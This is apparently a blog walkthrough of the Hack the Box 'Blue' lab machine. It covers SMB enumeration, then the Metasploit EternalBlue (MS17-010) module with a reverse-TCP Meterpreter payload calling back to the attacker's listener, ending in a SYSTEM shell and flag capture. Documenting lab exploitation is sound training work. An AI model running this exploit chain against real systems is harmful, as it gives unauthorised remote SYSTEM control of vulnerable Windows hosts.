---
layout: post
title:  "Hack the Box - Blue"
date:   2017-07-28 23:23:00
categories: [walkthrough, htb]
comments: false
---
![HTB-Blue](/img/htb/blue/blue.png)

An easy box by ch4p.  Great for getting to know metasploit, or practice if you want to find and modify the exploit from exploit-db.com.

{% highlight bash %}
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
{% endhighlight %}

<!--more-->
## Host Discovery

Starting this one off with a light nmap scan to see if there is anything interesting on the standard 1000 ports.

{% highlight bash %}
┌[ ~/hackthebox/boxes/blue-10.10.10.40 ] [master ?]
└─> root@kali # nmap -sV 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-06 10:42 MST
Nmap scan report for 10.10.10.40
Host is up (0.072s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.60 seconds

┌[ ~/hackthebox/boxes/blue-10.10.10.40 ] [master ?]
└─> root@kali #
{% endhighlight %}

Sure enough, SMB is open on the system, and based on the name of the box chances are this is an EternalBlue (MS17_010) exploitable box.

## Enumeration/Port Mapping

Lets see if you can login as a guest by attempting to list and then login to a share without specifying a user.

{% highlight bash %}
┌[ ~/hackthebox/boxes/blue-10.10.10.40 ] [master ?]
└─> root@kali # smbclient -L //10.10.10.40
Enter WORKGROUP\root's password:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available

┌[ ~/hackthebox/boxes/blue-10.10.10.40 ] [master ?]
└─> root@kali # smbclient  //10.10.10.40/Users
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Jul 21 00:56:23 2017
  ..                                 DR        0  Fri Jul 21 00:56:23 2017
  Default                           DHR        0  Tue Jul 14 01:07:31 2009
  desktop.ini                       AHS      174  Mon Jul 13 22:54:24 2009
  Public                             DR        0  Tue Apr 12 01:51:29 2011

		8362495 blocks of size 4096. 3842276 blocks available
smb: \>
{% endhighlight %}

Sure enough we can get into the Users share without any real credentials.  On to exploitation!

## Exploitation - MS17-010 EternalBLue

Now, this is the non OSCP friendly way to do it, but chances are this is the way most folks will go ahead and do it.  Using Metasploit and the `exploit/windows/smb/ms17_010_eternalblue)` built in we should be able to get a system shell.

{% highlight bash %}
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


 Payload options (windows/x64/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     10.10.14.17      yes       The listen address (an interface may be specified)
    LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) >
{% endhighlight %}

Payload all set now we just run:

{% highlight bash %}
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.17:443
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Meterpreter session 1 opened (10.10.14.17:443 -> 10.10.10.40:49158) at 2020-02-06 10:21:13 -0700
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
{% endhighlight %}

## Loot!

{% highlight bash %}
meterpreter > shell
Process 2828 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd \users\administrator\desktop
cd \users\administrator\desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ff54************************e717

C:\Users\haris>cd \Users\haris\desktop
cd \Users\haris\desktop

C:\Users\haris\Desktop>type user.txt
type user.txt
4c54***********************deea9
C:\Users\haris\Desktop>
{% endhighlight %}

That is all there is to it.
